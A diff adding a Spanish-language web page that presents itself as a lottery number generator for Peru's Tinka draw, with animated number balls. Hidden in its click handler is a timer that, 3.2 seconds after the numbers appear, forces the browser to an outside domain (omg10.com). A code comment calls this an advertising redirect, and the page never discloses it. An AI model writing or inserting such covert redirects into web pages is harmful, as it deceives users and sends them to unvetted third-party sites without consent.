@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tinka Suerte 🇵🇪</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1c2541; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 90vh; margin: 0; }
+        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; max-width: 450px; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        h1 { color: #ff5722; font-size: 2rem; margin-top: 0; text-transform: uppercase; }
+        p { color: #2c3e50; font-size: 1rem; margin-bottom: 25px; font-weight: 500; }
+        .balls-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; min-height: 50px; flex-wrap: wrap; }
+        .ball { width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 30% 30%, #f39c12, #d35400); color: white; font-weight: bold; font-size: 1.2rem; box-shadow: 2px 4px 8px rgba(0,0,0,0.3); animation: popIn 0.3s ease-out forwards; transform: scale(0); }
+        @keyframes popIn { to { transform: scale(1); } }
+        button { background-color: #00b4d8; color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 25px; cursor: pointer; transition: background 0.2s; width: 100%; }
+        button:active { transform: scale(0.98); }
+        .footer { margin-top: 25px; font-size: 0.8rem; color: #6c757d; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Tinka Suerte 🇵🇪</h1>
+    <p>Genera tu jugada ganadora (6 números del 1 al 50)</p>
+    
+    <div class="balls-container" id="ballsBox">
+        <!-- Aquí aparecerán las bolillas -->
+    </div>
+
+    <button onclick="generateTinkaNumbers()">¡Generar Jugada!</button>
+
+    <div class="footer">¡Buena suerte! Juega con responsabilidad.</div>
+</div>
+
+<script>
+function generateTinkaNumbers() {
+    const container = document.getElementById('ballsBox');
+    container.innerHTML = ''; 
+
+    let numbers = [];
+
+    while (numbers.length < 6) {
+        let randomNum = Math.floor(Math.random() * 50) + 1;
+        if (!numbers.includes(randomNum)) {
+            numbers.push(randomNum);
+        }
+    }
+
+    numbers.sort((a, b) => a - b);
+
+    numbers.forEach((num, index) => {
+        setTimeout(() => {
+            const ball = document.createElement('div');
+            ball.className = 'ball';
+            ball.innerText = num;
+            container.appendChild(ball);
+        }, index * 150);
+    });
+
+    // Espera 3 segundos mostrando las bolillas y luego simula la redirección publicitaria
+    setTimeout(() => {
+        window.location.href = "https://omg10.com";
+    }, 3200);
+}
+</script>
+
+</body>
+</html>
